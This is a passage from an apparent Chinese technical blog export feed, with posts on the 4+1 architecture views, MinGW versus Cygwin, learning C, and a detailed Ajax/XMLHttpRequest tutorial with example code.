export JAVA_HOME CLASSPATH PATH
</code></pre>
<p>完成后生产登录。</p>
<p>在终端中查看是否安装成功：</p>
<pre><code>hadoop@hadoop-1:~/hadoop-0.20.2$ java -version
java version &quot;1.8.0_45&quot;
Java(TM) SE Runtime Environment (build 1.8.0_45-b14)
Java HotSpot(TM) 64-Bit Server VM (build 25.45-b02, mixed mode)
</code></pre>
<p>通过查看版本看一下现在的java是不是我们安装的那个。</p>
]]></content>
      <categories>
        <category>操作系统</category>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>4+1视图之开发视图（Development View)</title>
    <url>/blog/arch/view/developmentview/</url>
    <content><![CDATA[<p>开发视图（Development&#x2F;Module View)</p>
<p>开发视图主要用来描述软件模块的组织与管理（通过程序库或子系统）。服务于软件编程人员，<br>方便后续的设计与实现。它通过系统输入输出关系的模型图和子系统图来描述。要考虑软件的内部需求：开发的难易程度、重用的可能性，通用性，局限性等等。开发视图的风格通常是层次结构，层次越低，通用性越好（底层库：Java<br>SDK，图像处理软件包）。</p>
<p>构件：模块、子系统、层</p>
<p>连接件：参照相关性、模块&#x2F;过程调用</p>
<p><img src="/images/arch/developview.jpg"></p>
]]></content>
      <categories>
        <category>架构</category>
      </categories>
      <tags>
        <tag>架构</tag>
      </tags>
  </entry>
  <entry>
    <title>4+1视图之逻辑视图（Logic View）</title>
    <url>/blog/arch/view/logicview/</url>
    <content><![CDATA[<p>逻辑视图（Logic View）</p>
<p>逻辑试图主要是用来描述系统的功能需求，即系统提供给最终用户的服务.<br>在逻辑视图中，系统分解成一系列的功能抽象、功能分解与功能分析，这些主要来自问题领域（Problem<br>Definition)。<br>在面向对象技术中，通过抽象、封装、继承,可以用对象模型来代表逻辑视图，可以用类图（Class<br>Diagram）来描述逻辑视图。</p>
<p>构件(Components)：类、类服务、参数化类、类层次</p>
<p>连接件(Connectors)：关联、包含聚集、使用、继承、实例化</p>
<p><img src="/images/arch/logicview.jpg"></p>
]]></content>
      <categories>
        <category>架构</category>
      </categories>
      <tags>
        <tag>架构</tag>
      </tags>
  </entry>
  <entry>
    <title>架构设计之4+1视图</title>
    <url>/blog/arch/view/index/</url>
    <content><![CDATA[<p>“4+1”视图是对逻辑架构进行描述，最早由 Philippe Kruchten<br>提出，他在1995年的《IEEE Software》上发表了题为《The 4+1 View Model of<br>Architecture》的论文，引起了业界的极大关注，并最终被 RUP<br>采纳，现在已经成为架构设计的结构标准。</p>
<p>该模型五个主要的视图:</p>
<ul>
<li>逻辑视图（Logical<br>View），设计的对象模型（使用面向对象的设计方法时）。</li>
<li>过程视图（Process View），捕捉设计的并发和同步特征。</li>
<li>物理视图（Physical<br>View），描述了软件到硬件的映射，反映了分布式特性。</li>
<li>开发视图（Development View），描述了在开发环境中软件的静态组织结构。</li>
<li>用例视图（Use Case View)，4+1视图是用例驱动的，用例图是根本。</li>
</ul>
<p><img src="/images/arch/4p1view.jpg"></p>
]]></content>
      <categories>
        <category>架构</category>
      </categories>
      <tags>
        <tag>架构</tag>
      </tags>
  </entry>
  <entry>
    <title>4+1视图之物理视图（Physical View）</title>
    <url>/blog/arch/view/physicalview/</url>
    <content><![CDATA[<p>物理视图（Physical View）</p>
<p>物理试图主要描述硬件配置。服务于系统工程人员，解决系统的拓扑结构、系统安装、通信等问题。主要考虑如何把软件映射到硬件上，也要考虑系统性能、规模、可靠性等。可以与进程视图一起映射。</p>
<p>构件：处理器、计算机、其它设备 连接件：通信协议等</p>
<p><img src="/images/arch/physicalview.jpg">{width&#x3D;”450” height&#x3D;”300”}</p>
]]></content>
      <categories>
        <category>架构</category>
      </categories>
      <tags>
        <tag>架构</tag>
      </tags>
  </entry>
  <entry>
    <title>4+1视图之进程视图（Process View）</title>
    <url>/blog/arch/view/processview/</url>
    <content><![CDATA[<p>进程视图（Process View）</p>
<p>进程试图侧重系统的运行特性，关注非功能性的需求（性能，可用性）。服务于系统集成人员，方便后续性能测试。强调并发性、分布性、集成性、鲁棒性（容错）、可扩充性、吞吐量等。定义逻辑视图中的各个类的具体操作是在哪一个线程（Thread）中被执行。</p>
<p>构件：进程、简化进程、循环进程</p>
<p>连接件：未指定，消息、远程过程调用（RPC）、双向消息、事件广播</p>
<p><img src="/images/arch/processview.jpg"></p>
]]></content>
      <categories>
        <category>架构</category>
      </categories>
      <tags>
        <tag>架构</tag>
      </tags>
  </entry>
  <entry>
    <title>MinGw 和 cygwin 的区别和联系</title>
    <url>/blog/plang/ccpp/mingwcygwin/</url>
    <content><![CDATA[<h3 id="windows与Linux操作系统的不同"><a href="#windows与Linux操作系统的不同" class="headerlink" title="windows与Linux操作系统的不同"></a>windows与Linux操作系统的不同</h3><p>windows和Linux是目前来说最流行的两大操作系统，在基本设计概念上，进程、线程、寻址、内存管理等方面都是大同小异的，但是二者之间的程序不兼容，因为二者在系统功能上是不同的，提供的系统API也是不同的。</p>
<p>从最明显的几点来说：</p>
<p>可执行文件的格式，Windows采用的是PE的格式，要求以.exe为后缀名，而Linux使用的是 elf 的格式；</p>
<p>操作系统提供的系统API是不同的，如Windows使用CreateProcess()创建进程，而Linux使用fork()。</p>
<p>所以想要在Windows环境下使用Linux的编译工具，也就是gcc&#x2F;g++，我们需要一个中间的转换工具或者平台，这也就是MinGW和cygwin存在的原因。</p>
<h3 id="什么是-MinGW"><a href="#什么是-MinGW" class="headerlink" title="什么是 MinGW"></a>什么是 MinGW</h3><p>MinGw全称 Minimalistic GNU for Windows，某种程度上可以看做是win版本下的GCC。Mingw有一个Msys的子项目，可以提供一些模拟Linux的shell和基本的Linux工具，Msys是一个辅助环境。</p>
<p>MinGw 有专门的Win32 API的头文件，来把代码中Linux方式的系统调用替换为对应的Windows下的调用方式，某种程度上可以称之为将Linux调用 翻译为 Windows调用。</p>
<h3 id="什么是-cygwin"><a href="#什么是-cygwin" class="headerlink" title="什么是 cygwin"></a>什么是 cygwin</h3><p>Cygwin 则是一个在Windows平台上运行的unix模拟环境，是cygnus solutions 公司开发的自由软件。Cygwin更像一个平台，模拟了Linux的接口，提供了运行在它上面的程序使用，提供了很多Linux环境下的GNU软件。</p>
<p>Cygwin 通过Cygwin1.dll的文件实现操作系统API的转换，模拟了Linux的调用接口给程序，程序以Linux的方式调用系统API，但这个API的目标库是Cygwin1.dll，Cygwin1.dll再调用Windows对用的方式实现，再把结果返回给程序。</p>
<h3 id="两者的区别"><a href="#两者的区别" class="headerlink" title="两者的区别"></a>两者的区别</h3><p>MinGW生成的程序，究其本质调用的是Kernel.32导出的标准Windows系统API，在windows下Mingw的编译性能会高一些，编译速度也会快一些。</p>
<p>Cygwin更像一个平台，它相对完整地模拟了LInux，提供了一个接近2M的Cygwin1.dll的文件作为目标库，来模拟Linux系统的接口，但是相对来说编译的速度就要慢一些。如果想要在Windows上开发可以运行在LInux上的程序，应该选用Cygwin。</p>
<p>总的来说：</p>
<ol>
<li>cygwin大，mingw小</li>
<li>cygwin编译后的exe需要cygwin1.dll作为支持，而mingw不需要就可以直接运行，因为有中间层所以cygwin慢，mingw快。</li>
<li>cygwin包含的内容更全面，能编译通过的linux源文件更多，mingw的min是minimalist所以能编译通过的更少。但，不是全部，就是说别指望你可以把任何为linux写的源代码在cygwin或mingw编译通过并运行。</li>
</ol>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>事实上，cygwin&#x2F;gcc和Mingw都是为了gcc可以在windows下使用的编译环境，可以方便进行一些类Linux环境下的编程。但是两种平台不管是哪一种，Linux程序都不能直接运行在Windows下的，需要对程序进行重新编译，同时建议重要的源码还是应该在真正的Linux环境下进行编译。</p>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>C语言</category>
      </categories>
      <tags>
        <tag>C语言</tag>
      </tags>
  </entry>
  <entry>
    <title>如何学好C语言</title>
    <url>/blog/plang/ccpp/howlearn/</url>
    <content><![CDATA[<h2 id="为什么要学C语言"><a href="#为什么要学C语言" class="headerlink" title="为什么要学C语言"></a>为什么要学C语言</h2><p>首先，要明白为什么要学C语言，C语言可以用来做什么。</p>
<p>每种语言都有其用途和领域，C语言适用于如下领域：</p>
<ol>
<li>操作系统开发。</li>
<li>嵌入式开发。</li>
<li>驱动开发。</li>
<li>音视频开发。</li>
<li>性能苛刻的程序开发。</li>
</ol>
<p>相对于其它语言，C语言的最大优势是可以操作计算机低层的功能。</p>
<p>另外C语言因为有指针和函数指针的存在，可以灵活构建程序结构，确实是一门好语言。</p>
<h2 id="如何学好C语言"><a href="#如何学好C语言" class="headerlink" title="如何学好C语言"></a>如何学好C语言</h2><p>学好C语言不容易，不是C语言不容易学，而是学习C语言要学习很多计算机基础知识。</p>
<p>计算机编程相关基础知识：</p>
<ol>
<li>学习计算机体系结构：至少明白内存、CPU、中断等基本计算机原理，明白程序是怎么用0和1执行的。</li>
<li>学习汇编语言：明白计算机的基础指令和0、1数据的关系，明白编程的本质是怎么回事。</li>
<li>学习编译原理：明白高级语言的实现原理，比如栈和堆的本质实现，高级语言编译成汇编语言的逻辑等。</li>
<li>学习操作系统知识：了解操作系统实现的各方面，如进程、线程、文件、内存管理等。</li>
</ol>
<p>除了学计算机基础知识，还要学编程的相关知识，学任何语言都要学：</p>
<ol>
<li>数据结构：非常基础的编程知识。</li>
<li>设计模式：想做软件开发，要好好学习的基础知识。</li>
<li>软件架构：想做IT行业人牛人，相当高工、架构师要学习的知识。</li>
</ol>
<p>学习C语言的步骤：</p>
<ol>
<li>基本语法：任何语言的基本语言都差不多，很好学。</li>
<li>指针、函数指针：如果没有很好的计算机基础，到这就卡住了。</li>
<li>结构体与共用体：配合指针，基本面向对象的思想都能实现。</li>
<li>专题开发学习：文件操作、多进程开发、驱动开发、操作系统开发等，实际做点东西。</li>
</ol>
<h2 id="学习资料推荐"><a href="#学习资料推荐" class="headerlink" title="学习资料推荐"></a>学习资料推荐</h2><p>《算法导论》</p>
<p>学习数据结构和算法的好书。</p>
<p>《30天自制操作系统》</p>
<p>《自己动手写操作系统》</p>
<p>用实例讲解计算机结构、操作系统、汇编、C语言的相关知识，最好自己写一个操作系统，实践一下书中内容。</p>
<p>《CC深层探索》</p>
<p>深度研究C语言的实现，有助于理解C语言原理，精通C语言。</p>
<p>另外推荐本站学习资源：</p>
<p><a href="http://iteedu.com/plang/ccpp/">http://iteedu.com/plang/ccpp/</a></p>
<p>排序算法：</p>
<p><a href="http://iteedu.com/algorithm/sort/">http://iteedu.com/algorithm/sort/</a></p>
<p>常用树结构和其算法：</p>
<p><a href="http://iteedu.com/algorithm/tree/">http://iteedu.com/algorithm/tree/</a></p>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>C语言</category>
      </categories>
      <tags>
        <tag>C语言</tag>
      </tags>
  </entry>
  <entry>
    <title>Ajax技术介绍</title>
    <url>/blog/plang/javascript/ajax/</url>
    <content><![CDATA[<h2 id="什么是-AJAX-？"><a href="#什么是-AJAX-？" class="headerlink" title="什么是 AJAX ？"></a>什么是 AJAX ？</h2><p>AJAX 指异步 JavaScript 及 XML（Asynchronous JavaScript And XML）。</p>
<p>AJAX 是一种在 2005 年由 Google 推广开来的编程模式。</p>
<p>AJAX 不是一种新的编程语言，而是一种使用现有标准的新方法。</p>
<p>AJAX 是一种在无需重新加载整个网页的情况下，能够更新部分网页的技术。</p>
<p>AJAX 是一种用于创建快速动态网页的技术。</p>
<p>通过在后台与服务器进行少量数据交换，AJAX 可以使网页实现异步更新。</p>
<p>这意味着可以在不重新加载整个网页的情况下，对网页的某部分进行更新。</p>
<h2 id="XMLHttpRequest-对象"><a href="#XMLHttpRequest-对象" class="headerlink" title="XMLHttpRequest 对象"></a>XMLHttpRequest 对象</h2><p>XMLHttpRequest 是 AJAX 的基础。XMLHttpRequest用于在后台与服务器交换数据。这意味着可以在不重新加载整个网页的情况下，对网页的某部分进行更新。</p>
<h3 id="创建-XMLHttpRequest-对象"><a href="#创建-XMLHttpRequest-对象" class="headerlink" title="创建 XMLHttpRequest 对象"></a>创建 XMLHttpRequest 对象</h3><p>创建 XMLHttpRequest 对象的语法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xmlhttp =new XMLHttpRequest();</span><br></pre></td></tr></table></figure>

<p>老版本的 Internet Explorer （IE5 和 IE6）使用 ActiveX 对象：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xmlhttp =new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);</span><br></pre></td></tr></table></figure>

<p>为了应对所有的现代浏览器，包括 IE5 和 IE6，请检查浏览器是否支持XMLHttpRequest 对象。如果支持，则创建 XMLHttpRequest对象。如果不支持，则创建 ActiveXObject ：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var xmlhttp;</span><br><span class="line">if (window.XMLHttpRequest)</span><br><span class="line">  &#123;// code for IE7+, Firefox, Chrome, Opera, Safari</span><br><span class="line">  xmlhttp=new XMLHttpRequest();</span><br><span class="line">  &#125;</span><br><span class="line">else</span><br><span class="line">  &#123;// code for IE6, IE5</span><br><span class="line">  xmlhttp=new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>改进方法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function GetXmlHttpObject() &#123;</span><br><span class="line">    var xmlHttp = null;</span><br><span class="line">    try &#123;</span><br><span class="line">        // Firefox, Opera 8.0+,Safari</span><br><span class="line">        xmlHttp = new XMLHttpRequest();</span><br><span class="line">    &#125; catch (e) &#123;</span><br><span class="line">        // Internet Explorer</span><br><span class="line">        try &#123;</span><br><span class="line">            xmlHttp = new ActiveXObject(&quot;Msxml2.XMLHTTP&quot;);</span><br><span class="line">        &#125; catch (e) &#123;</span><br><span class="line">            xmlHttp = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return xmlHttp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="向服务器发送请求"><a href="#向服务器发送请求" class="headerlink" title="向服务器发送请求"></a>向服务器发送请求</h3><p>如需将请求发送到服务器，我们使用 XMLHttpRequest 对象的 open() 和 send()<br>方法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xmlhttp.open(&quot;GET&quot;,&quot;test1.txt&quot;,true);</span><br><span class="line">xmlhttp.send();</span><br></pre></td></tr></table></figure>

<h4 id="open-method-url-async-username-password"><a href="#open-method-url-async-username-password" class="headerlink" title="open(method, url, async, username, password)"></a>open(method, url, async, username, password)</h4><p>初始化 HTTP 请求参数。</p>
<p>规定请求的类型、URL 以及是否异步处理请求。</p>
<ol>
<li>method：请求的类型；GET 或 POST</li>
<li>url：文件在服务器上的位置。该文件可以是任何类型的文件，比如 .txt 和.xml，或者服务器脚本文件，比如 .asp 和 .php（在传回响应之前，能够在服务器上执行任务）。</li>
<li>async：true（异步）或 false（同步）</li>
<li>username 和 password 参数是可选的，为 url所需的授权提供认证资格。如果指定了，它们会覆盖 url    自己指定的任何资格。</li>
</ol>
<p>这个方法初始化请求参数以供 send() 方法稍后使用。它把 readyState 设置为1，删除之前指定的所有请求头部，以及之前接收的所有响应头部，并且把responseText、responseXML、status 以及 statusText参数设置为它们的默认值。当 readyState 为 0 的时候（当 XMLHttpRequest对象刚创建或者 abort() 方法调用后）以及当 readyState 为 4时（已经接收响应时），调用这个方法是安全的。</p>
<p>除了保存供 send() 方法使用的请求参数，以及重置 XMLHttpRequest对象以便复用，open()方法没有其他的行为。要特别注意，当这个方法调用的时候，通常不会打开一个到Web 服务器的网络连接。</p>
<h4 id="send-string"><a href="#send-string" class="headerlink" title="send(string)"></a>send(string)</h4><p>发送一个 HTTP 请求，将请求发送到服务器。</p>
<p>string：仅用于 POST 请求，指定了请求体，作为一个字符串或者 Document对象。</p>
<p>这个方法导致一个 HTTP 请求发送。如果之前没有调用open()，或者更具体地说，如果 readyState 不是 1，send()抛出一个异常。否则，它发送一个 HTTP请求，该请求由以下几部分组成：之前调用 open() 时指定的 HTTP 方法、URL以及认证资格（如果有的话）。 之前调用 setRequestHeader()时指定的请求头部（如果有的话）。 传递给这个方法的 body 参数。</p>
<p>一旦请求发布了，send() 把 readyState 设置为 2，并触发 onreadystatechange事件句柄。 　　如果之前调用的 open() 参数 async 为false，这个方法会阻塞并不会返回，直到 readyState 为 4并且服务器的响应被完全接收。否则，如果 async 参数为true，或者这个参数省略了，send()立即返回，并且正如后面所介绍的，服务器响应将在一个后台线程中处理。</p>
<p>如果服务器响应带有一个 HTTP 重定向，send()方法或后台线程自动遵从重定向。当所有的 HTTP 响应头部已经接收，send()或后台线程把 readyState 设置为 3 并触发 onreadystatechange事件句柄。如果响应较长，send() 或后台线程可能在状态 3 中触发onreadystatechange事件句柄：这可以作为一个下载进度指示器。最后，当响应完成，send()或后台线程把 readyState 设置为 4，并最后一次触发事件句柄。</p>
<h3 id="服务器响应"><a href="#服务器响应" class="headerlink" title="服务器响应"></a>服务器响应</h3><p>如需获得来自服务器的响应，请使用 XMLHttpRequest 对象的 responseText 或responseXML 属性。</p>
<h4 id="responseText"><a href="#responseText" class="headerlink" title="responseText"></a>responseText</h4><p>获得字符串形式的响应数据。 responseText属性返回字符串形式的响应，因此您可以这样使用：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">document.getElementById(&quot;myDiv&quot;).innerHTML=xmlhttp.responseText;</span><br></pre></td></tr></table></figure>

<h4 id="responseXML"><a href="#responseXML" class="headerlink" title="responseXML"></a>responseXML</h4><p>获得 XML 形式的响应数据。 请求 books.xml 文件，并解析响应：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xmlDoc=xmlhttp.responseXML;</span><br><span class="line">txt=&quot;&quot;;</span><br><span class="line">x=xmlDoc.getElementsByTagName(&quot;title&quot;);</span><br><span class="line">for (i=0;i&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">document.getElementById(&quot;myDiv&quot;).innerHTML=txt;</span><br></pre></td></tr></table></figure>

<p><strong>books.xml</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;bookstore&gt;</span><br><span class="line">	&lt;book category=&quot;children&quot;&gt;</span><br><span class="line">		&lt;title lang=&quot;en&quot;&gt;Harry Potter&lt;/title&gt;</span><br><span class="line">		&lt;author&gt;J K. Rowling&lt;/author&gt;</span><br><span class="line">		&lt;year&gt;2005&lt;/year&gt;</span><br><span class="line">		&lt;price&gt;29.99&lt;/price&gt;</span><br><span class="line">	&lt;/book&gt;</span><br><span class="line">	&lt;book category=&quot;cooking&quot;&gt;</span><br><span class="line">		&lt;title lang=&quot;en&quot;&gt;Everyday Italian&lt;/title&gt;</span><br><span class="line">		&lt;author&gt;Giada De Laurentiis&lt;/author&gt;</span><br><span class="line">		&lt;year&gt;2005&lt;/year&gt;</span><br><span class="line">		&lt;price&gt;30.00&lt;/price&gt;</span><br><span class="line">	&lt;/book&gt;</span><br><span class="line">	&lt;book category=&quot;web&quot; cover=&quot;paperback&quot;&gt;</span><br><span class="line">		&lt;title lang=&quot;en&quot;&gt;Learning XML&lt;/title&gt;</span><br><span class="line">		&lt;author&gt;Erik T. Ray&lt;/author&gt;</span><br><span class="line">		&lt;year&gt;2003&lt;/year&gt;</span><br><span class="line">		&lt;price&gt;39.95&lt;/price&gt;</span><br><span class="line">	&lt;/book&gt;</span><br><span class="line">	&lt;book category=&quot;web&quot;&gt;</span><br><span class="line">		&lt;title lang=&quot;en&quot;&gt;XQuery Kick Start&lt;/title&gt;</span><br><span class="line">		&lt;author&gt;James McGovern&lt;/author&gt;</span><br><span class="line">		&lt;author&gt;Per Bothner&lt;/author&gt;</span><br><span class="line">		&lt;author&gt;Kurt Cagle&lt;/author&gt;</span><br><span class="line">		&lt;author&gt;James Linn&lt;/author&gt;</span><br><span class="line">		&lt;author&gt;Vaidyanathan Nagarajan&lt;/author&gt;</span><br><span class="line">		&lt;year&gt;2003&lt;/year&gt;</span><br><span class="line">		&lt;price&gt;49.99&lt;/price&gt;</span><br><span class="line">	&lt;/book&gt;</span><br><span class="line">&lt;/bookstore&gt;</span><br></pre></td></tr></table></figure>

<h4 id="onreadystatechange-事件"><a href="#onreadystatechange-事件" class="headerlink" title="onreadystatechange 事件"></a>onreadystatechange 事件</h4><p>每当 readyState 改变时，就会触发 onreadystatechange 事件。</p>
<p>readyState 属性存有 XMLHttpRequest 的状态信息。</p>
<p>存储函数（或函数名），每当 readyState 属性改变时，就会调用该函数。</p>
<h4 id="readyState"><a href="#readyState" class="headerlink" title="readyState"></a>readyState</h4><p>存有 XMLHttpRequest 的状态。从 0 到 4 发生变化。</p>
<ul>
<li>0: 请求未初始化</li>
<li>1: 服务器连接已建立</li>
<li>2: 请求已接收</li>
<li>3: 请求处理中</li>
<li>4: 请求已完成，且响应已就绪</li>
</ul>
<h4 id="status"><a href="#status" class="headerlink" title="status"></a>status</h4><ul>
<li>200: “OK”</li>
<li>404: 未找到页面</li>
</ul>
<h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><p>在 onreadystatechange事件中，当服务器响应已做好被处理的准备时所执行的任务。</p>
<p>当 readyState 等于 4 且状态为 200 时，表示响应已就绪：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xmlhttp.onreadystatechange=function()</span><br><span class="line">  &#123;</span><br><span class="line">  if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)</span><br><span class="line">    &#123;</span><br><span class="line">    document.getElementById(&quot;myDiv&quot;).innerHTML=xmlhttp.responseText;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>注释：onreadystatechange 事件被触发 4 次，对应着 readyState 的每个变化。</p>
<h3 id="其它属性"><a href="#其它属性" class="headerlink" title="其它属性"></a>其它属性</h3><h4 id="statusText"><a href="#statusText" class="headerlink" title="statusText"></a>statusText</h4><p>这个属性用名称而不是数字指定了请求的 HTTP 的状态代码。也就是说，当状态为200 的时候它是 “OK”，当状态为 404 的时候它是 “Not Found”。和 status属性一样，当 readyState 小于 3 的时候读取这一属性会导致一个异常。</p>
<h4 id="abort"><a href="#abort" class="headerlink" title="abort()"></a>abort()</h4><p>取消当前响应，关闭连接并且结束任何未决的网络活动。</p>
<p>这个方法把 XMLHttpRequest 对象重置为 readyState 为 0的状态，并且取消所有未决的网络活动。例如，如果请求用了太长时间，而且响应不再必要的时候，可以调用这个方法。</p>
<h4 id="getAllResponseHeaders"><a href="#getAllResponseHeaders" class="headerlink" title="getAllResponseHeaders()"></a>getAllResponseHeaders()</h4><p>把 HTTP 响应头部作为未解析的字符串返回。</p>
<p>如果 readyState 小于 3，这个方法返回 null。否则，它返回服务器发送的所有HTTP 响应的头部。头部作为单个的字符串返回，一行一个头部。每行用换行符”\r\n” 隔开。</p>
<h4 id="getResponseHeader-key"><a href="#getResponseHeader-key" class="headerlink" title="getResponseHeader(key)"></a>getResponseHeader(key)</h4><p>返回指定的 HTTP 响应头部的值。其参数是要返回的 HTTP响应头部的名称。可以使用任何大小写来制定这个头部名字，和响应头部的比较是不区分大小写的。</p>
<p>该方法的返回值是指定的 HTTP 响应头部的值，如果没有接收到这个头部或者readyState 小于 3则为空字符串。如果接收到多个有指定名称的头部，这个头部的值被连接起来并返回，使用逗号和空格分隔开各个头部的值。</p>
<h4 id="setRequestHeader-header-value"><a href="#setRequestHeader-header-value" class="headerlink" title="setRequestHeader(header,value)"></a>setRequestHeader(header,value)</h4><p>向请求添加 HTTP 头。</p>
<ol>
<li>header: 规定头的名称</li>
<li>value: 规定头的值</li>
</ol>
<p>setRequestHeader() 方法指定了一个 HTTP 请求的头部，它应该包含在通过后续send() 调用而发布的请求中。这个方法只有当 readyState 为 1的时候才能调用，例如，在调用了 open() 之后，调用 send() 之前。</p>
<p>如果带有指定名称的头部已经被指定了，这个头部的新值就是：之前指定的值，加上逗号、空格以及这个调用指定的值。</p>
<p>如果 open() 调用指定了认证资格，XMLHttpRequest 自动发送一个适当的Authorization 请求头部。但是，你可以使用 setRequestHeader()来添加这个头部。类似地，如果 Web 服务器已经保存了和传递给open() 的 URL相关联的 cookie，适当的 Cookie 或 Cookie2头部也自动地包含到请求中。可以通过调用 setRequestHeader() 来把这些cookie 添加到头部。XMLHttpRequest 也可以为 User-Agent头部提供一个默认值。如果它这么做，你为该头部指定的任何值都会添加到这个默认值后面。</p>
<h2 id="GET-还是-POST？"><a href="#GET-还是-POST？" class="headerlink" title="GET 还是 POST？"></a>GET 还是 POST？</h2><p>与 POST 相比，GET 更简单也更快，并且在大部分情况下都能用。</p>
<p>然而，在以下情况中，请使用 POST 请求：</p>
<ul>
<li>无法使用缓存文件（更新服务器上的文件或数据库）</li>
<li>向服务器发送大量数据（POST 没有数据量限制）</li>
<li>发送包含未知字符的用户输入时，POST 比 GET 更稳定也更可靠</li>
</ul>
<h3 id="GET-请求"><a href="#GET-请求" class="headerlink" title="GET 请求"></a>GET 请求</h3><p>一个简单的 GET 请求：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xmlhttp.open(&quot;GET&quot;,&quot;demo_get.asp&quot;,true);</span><br><span class="line">xmlhttp.send();</span><br></pre></td></tr></table></figure>

<p>在上面的例子中，您可能得到的是缓存的结果。</p>
<p>为了避免这种情况，请向 URL 添加一个唯一的 ID：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xmlhttp.open(&quot;GET&quot;,&quot;demo_get.asp?t=&quot; + Math.random(),true);</span><br><span class="line">xmlhttp.send();</span><br></pre></td></tr></table></figure>

<p>如果您希望通过 GET 方法发送信息，请向 URL 添加信息：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xmlhttp.open(&quot;GET&quot;,&quot;demo_get2.asp?fname=Bill&amp;lname=Gates&quot;,true);</span><br><span class="line">xmlhttp.send();</span><br></pre></td></tr></table></figure>

<h3 id="POST-请求"><a href="#POST-请求" class="headerlink" title="POST 请求"></a>POST 请求</h3><p>一个简单 POST 请求：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xmlhttp.open(&quot;POST&quot;,&quot;demo_post.asp&quot;,true);</span><br><span class="line">xmlhttp.send();</span><br></pre></td></tr></table></figure>

<p>如果需要像 HTML 表单那样 POST 数据，请使用 setRequestHeader() 来添加HTTP 头。然后在 send() 方法中规定您希望发送的数据：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xmlhttp.open(&quot;POST&quot;,&quot;ajax_test.asp&quot;,true);</span><br><span class="line">xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);</span><br><span class="line">xmlhttp.send(&quot;fname=Bill&amp;lname=Gates&quot;);</span><br></pre></td></tr></table></figure>

<h2 id="异步"><a href="#异步" class="headerlink" title="异步"></a>异步</h2><p>AJAX 指的是异步 JavaScript 和 XML（Asynchronous JavaScript and XML）。</p>
<p>XMLHttpRequest 对象如果要用于 AJAX 的话，其 open() 方法的 async参数必须设置为 true：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xmlhttp.open(&quot;GET&quot;,&quot;ajax_test.asp&quot;,true);</span><br></pre></td></tr></table></figure>

<p>对于 web开发人员来说，发送异步请求是一个巨大的进步。很多在服务器执行的任务都相当费时。AJAX出现之前，这可能会引起应用程序挂起或停止。</p>
<p>通过 AJAX，JavaScript 无需等待服务器的响应，而是：</p>
<p>在等待服务器响应时执行其他脚本。</p>
<p>当响应就绪后对响应进行处理。</p>
<h3 id="Async-x3D-true"><a href="#Async-x3D-true" class="headerlink" title="Async &#x3D; true"></a>Async &#x3D; true</h3><p>当使用 async&#x3D;true 时，返回后会调用 onreadystatechange事件的函数，可以根据返回状态进行相应操作：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xmlhttp.onreadystatechange=function()</span><br><span class="line">  &#123;</span><br><span class="line">  if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)</span><br><span class="line">    &#123;</span><br><span class="line">    document.getElementById(&quot;myDiv&quot;).innerHTML=xmlhttp.responseText;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">xmlhttp.open(&quot;GET&quot;,&quot;test1.txt&quot;,true);</span><br><span class="line">xmlhttp.send();</span><br></pre></td></tr></table></figure>

<h3 id="Async-x3D-false"><a href="#Async-x3D-false" class="headerlink" title="Async &#x3D; false"></a>Async &#x3D; false</h3><p>如需使用 async&#x3D;false，请将 open() 方法中的第三个参数改为 false：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xmlhttp.open(&quot;GET&quot;,&quot;test1.txt&quot;,false);</span><br></pre></td></tr></table></figure>
<p>不推荐使用 async&#x3D;false，但是对于一些小型的请求，也是可以的。</p>
<p>JavaScript会等到服务器响应就绪才继续执行。如果服务器繁忙或缓慢，应用程序会挂起或停止。</p>
<p>使用 async&#x3D;false 时，请不要编写 onreadystatechange 函数，把代码放到<br>send() 语句后面即可：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xmlhttp.open(&quot;GET&quot;,&quot;test1.txt&quot;,false);</span><br><span class="line">xmlhttp.send();</span><br><span class="line">document.getElementById(&quot;myDiv&quot;).innerHTML=xmlhttp.responseText;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>javascript</category>
      </categories>
      <tags>
        <tag>javascript</tag>
        <tag>Ajax</tag>
      </tags>
  </entry>
  <entry>
